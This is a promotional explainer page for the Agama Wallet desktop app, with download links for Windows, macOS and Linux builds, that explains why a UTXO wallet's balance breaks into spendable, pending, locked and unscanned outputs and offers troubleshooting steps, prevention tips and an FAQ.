[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Why a UTXO Wallet Balance Is Not One Number

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A UTXO wallet computes its balance from the outputs it can currently spend, and those outputs fall into different states: confirmed and spendable, pending, locked, or not yet scanned. What a wallet shows as one figure is usually the sum of several categories, which is why the number changes between screens and sometimes refuses to be sent. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it reports balances the same way any output-based wallet does.

## You'll see this if

The balance looks right but a payment is refused, or the number moves after a restart without any transaction being sent.

| What you see | What it usually means |
|---|---|
| Balance shown, send fails with "insufficient funds" | Spendable is lower than total; some outputs are pending or locked |
| Balance drops after a restart | The wallet re-scanned and has not yet seen every output |
| Two wallets with the same phrase disagree | Different address ranges scanned, or a different derivation |
| Balance rises seconds after opening | Sync was incomplete; new outputs arrived as it caught up |
| Amount appears twice in history | A pending spend plus its change, before confirmation |

## Why it happens

There is no stored balance to read. A wallet derives addresses, asks the chain about each one, and adds up the outputs that are unspent and belong to it. Every step in that pipeline can be incomplete, and each incomplete step produces a different number.

Four categories are usually in play:

- **Spendable.** Confirmed outputs the wallet can spend right now. This is the only figure that matters for sending.
- **Pending.** Outputs from unconfirmed transactions, including your own change. Visible, not yet usable.
- **Locked or reserved.** Outputs committed to a pending transaction, a swap, or held by the wallet for another reason.
- **Unscanned.** Outputs that exist on addresses the wallet has not derived or checked yet, which is the category that makes a restore look wrong.

The last one explains most restore surprises: a wallet derives addresses in sequence and stops after a gap, so an output beyond that point simply is not part of the total. The accounting itself is described in [what a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md), and the contrast with a single stored balance in [UTXO vs the account model](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md).

## Fix

When the number and the behaviour disagree, work from the most restrictive category upwards.

1. **Read the spendable figure, not the headline.** Most wallets show it on the send screen, where it is smaller than the balance.
2. **Check for pending transactions.** A pending spend reserves its inputs, which lowers spendable even though nothing has left.
3. **Wait for sync to finish before judging a restore.** Watch the block height, not the spinner; a wallet that is still catching up is not authoritative yet.
4. **Confirm the mode.** SPV mode queries remote servers, Native mode validates locally; a stalled sync in either mode leaves outputs invisible, and [Native vs SPV mode](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md) covers the trade-off.
5. **Look for a locked output.** Swaps and pending spends can hold an output, and the wallet may not label it.
6. **Only then consider derivation.** If every category checks out and the output is still missing, the address range is the next suspect.

[UTXO management](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md) covers what to do once the outputs are all visible but inconveniently small.

## If that did not work

If a restored wallet shows zero while the addresses are funded on a block explorer, the wallet is deriving different addresses than the ones holding the funds. That is a derivation mismatch, not a loss, and [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) works through the causes in order.

If the balance appears and then disappears, a rescan is probably running: the wallet rebuilds its view from scratch and shows partial totals while it works.

If a specific output never becomes spendable, check whether it is the result of a transaction that never confirmed. An unconfirmed output is not spendable by any wallet until it confirms or is replaced.

## Prevention

- **Judge a wallet by its spendable figure.** The headline number answers a different question.
- **Keep the wallet open until sync completes.** Closing it mid-scan is how partial totals become beliefs.
- **Record addresses as you use them.** A list turns a missing balance into a specific question about one address.
- **Do not send from a restoring wallet.** Wait until the scan finishes and the total settles.
- **Expect a temporary double count after a spend.** The outgoing amount and the change both appear until confirmation.

## FAQ

### Why is my spendable balance lower than my total balance?

Because some outputs are pending, locked by a swap or a transaction, or not yet confirmed. Spendable counts only what can be used immediately.

### Does a UTXO wallet's balance include unconfirmed receipts?

Usually yes, in a separate "pending" line or in the total with a marker. Whether an unconfirmed output can be spent depends on the wallet and the chain's rules.

### Why did my balance change when I reopened the wallet?

The wallet re-derived its view from the chain. Any difference reflects outputs it had not yet seen or a transaction that confirmed while it was closed.

### Does a pending spend reduce my balance?

Yes, in the spendable figure. The inputs are reserved the moment the transaction is built, so they stop counting as available while the change is not yet confirmed. The total often looks almost unchanged because outgoing and change are both shown, which is why the two figures disagree.

### Can I force a wallet to see all my outputs?

Some wallets expose a gap-limit or address-scan setting that widens the search. Where it is not exposed, restoring with a wallet that scans a wider range is the practical alternative.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md)
- [Native Mode vs SPV Mode in Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md)
- [UTXO Management: Consolidating and Labelling Your Coins](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md)
- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
